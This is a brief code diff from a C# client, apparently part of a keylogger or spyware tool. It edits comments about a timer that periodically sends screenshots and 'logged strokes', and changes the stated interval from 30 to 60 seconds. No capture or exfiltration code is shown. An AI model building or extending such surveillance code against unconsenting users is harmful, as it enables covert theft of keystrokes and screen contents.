@@ -62,7 +62,7 @@ namespace Client.Armitage.Watchers
         }
         #endregion
         /// <summary>
-        /// If nothing happened in 30 seconds just send a screenshot.
+        /// If nothing happened in 60 seconds just send a screenshot.
         /// </summary>
         private static int MaxTimeLimit = 60;
 
@@ -70,7 +70,6 @@ namespace Client.Armitage.Watchers
         public static void Start()
         {
             _refreshtimer = new System.Timers.Timer();
-            // Every 30 seconds, automatically send the logged strokes.
             _refreshtimer.Interval = MaxTimeLimit * 1000;
             _refreshtimer.Elapsed += _refreshtimer_Elapsed; ;
             _refreshtimer.Start();
